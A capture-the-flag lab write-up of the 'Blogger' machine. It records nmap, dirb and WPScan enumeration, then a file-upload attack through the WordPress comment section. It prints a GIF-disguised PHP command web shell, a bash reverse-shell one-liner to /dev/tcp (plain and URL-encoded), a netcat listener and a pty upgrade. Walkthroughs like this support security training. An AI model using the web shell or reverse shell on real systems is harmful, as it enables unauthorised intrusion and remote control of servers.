## Nmap Scan

```
nmap -sVC -p- -A 192.168.52.217 --open
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 08:07 EDT
Nmap scan report for 192.168.52.217
Host is up (0.0037s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 951d828f5ede9a00a80739bdacadd344 (RSA)
|   256 d7b452a2c8fab70ed1a8d070cd6b3690 (ECDSA)
|_  256 dff24f773344d593d77917455aa1368b (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Blogger | Home
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.25 seconds

```

## Dirb

```
dirb http://192.168.52.217

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jul 12 08:08:33 2023
URL_BASE: http://192.168.52.217/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: http://192.168.52.217/ ----
                                                                                                                                                          ==> DIRECTORY: http://192.168.52.217/assets/
                                                                             ==> DIRECTORY: http://192.168.52.217/css/
                                                                             ==> DIRECTORY: http://192.168.52.217/images/
+ http://192.168.52.217/index.html (CODE:200|SIZE:46199)                    
                                                                             ==> DIRECTORY: http://192.168.52.217/js/
+ http://192.168.52.217/server-status (CODE:403|SIZE:279)                   
                                                                            
---- Entering directory: http://192.168.52.217/assets/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://192.168.52.217/css/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://192.168.52.217/images/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://192.168.52.217/js/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Wed Jul 12 08:08:37 2023
DOWNLOADED: 4612 - FOUND: 2

```

- In assets directory there are some files like js,css,images and fonts etc..
- mostly checked all the js files, nothing specifically useful.

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/f5c46b7e-b202-40dd-9968-63c13eb6ad7e)

- In the fonts , we can see the site called blog, that contains the meta of wordpress.

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/500ed0be-3190-445e-a55f-43507104aa36)

- So , on with WPscan

```
 wpscan --url http://192.168.57.217/assets/fonts/blog
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.57.217/assets/fonts/blog/ [192.168.57.217]
[+] Started: Wed Jul 12 13:55:35 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.57.217/assets/fonts/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.57.217/assets/fonts/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.57.217/assets/fonts/blog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.57.217/assets/fonts/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.8 identified (Insecure, released on 2018-08-02).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.57.217/assets/fonts/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.8'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.57.217/assets/fonts/blog/, Match: 'WordPress 4.9.8'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <> (100 / 137) 72.99%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (110 / 137) 80.29%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (116 / 137) 84.67%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (126 / 137) 91.97%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (131 / 137) 95.62%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jul 12 13:55:39 2023
[+] Requests Done: 164
[+] Cached Requests: 4
[+] Data Sent: 46.302 KB
[+] Data Received: 99.925 KB
[+] Memory used: 218.996 MB
[+] Elapsed time: 00:00:04

```

- we can find some wp-content/upload page can be accessed directly.
- What am I seeing here 😐
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/dbaeeb19-c270-4690-bcd2-f28cb1af4e82)

- Wget the file and reailized its a rabbit hole
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/2861e1ce-970f-4591-9673-4856be90d7e3)
- Found some other intresting one
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/46645adf-500f-49de-a44f-81071aa08b8e)

- Identified some plugins

```
[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.54.217/assets/fonts/blog/wp-content/plugins/akismet/
 | Last Updated: 2023-06-21T14:59:00.000Z
 | Readme: http://192.168.54.217/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.54.217/assets/fonts/blog/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.8 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.54.217/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.54.217/assets/fonts/blog/wp-content/plugins/akismet/readme.txt

[+] wpdiscuz
 | Location: http://192.168.54.217/assets/fonts/blog/wp-content/plugins/wpdiscuz/
 | Last Updated: 2023-06-03T12:37:00.000Z
 | Readme: http://192.168.54.217/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.6.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.54.217/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.54.217/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

```
## Lead

- In the fonts section we have the blog post page, that blog has the href with blogger.thm , so add the host with the blogger.thm to render get render the page correctly.

in `/etc/hosts` list add `<ip>   blogger.thm`

- In the post comment section there is a file upload vuln founded, we can upload a PHP file with the GIF format, like
```php
GIF89a
<?php
echo "<pre>";
passthru($_GET['cmd']);
echo "</pre>";
```
- save the file and upload in php format itself so we can open it and execute the commands and visualize in another page.
- after uploading right click on the php file and open in new tab and in the URL use `?cmd= <commands>`

## Spwning a shell

```bash
bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
```

- Even though we can't excecute it directly because the URL sanitization is happening , so insert the command as URL encoded.
`bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.51%2F9090%200%3E%261%27`

- Use a netcat listener `nc -nvlp 9090` at the host machine and then paste the URL encoded command in the `?cmd= <command>`

## user flag enumeration 
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/94ccc6d9-9ff2-4d90-ac0c-4ee9310494ba)

## Root - Privilage Escalation

- For enabling tty - interactive shell , we have the python3 available in the victim machine.
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/8c27806a-58d0-46a8-9656-eaf30ba952c9)

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/174df7a3-578b-446b-a97b-4371bd0e0ccf)
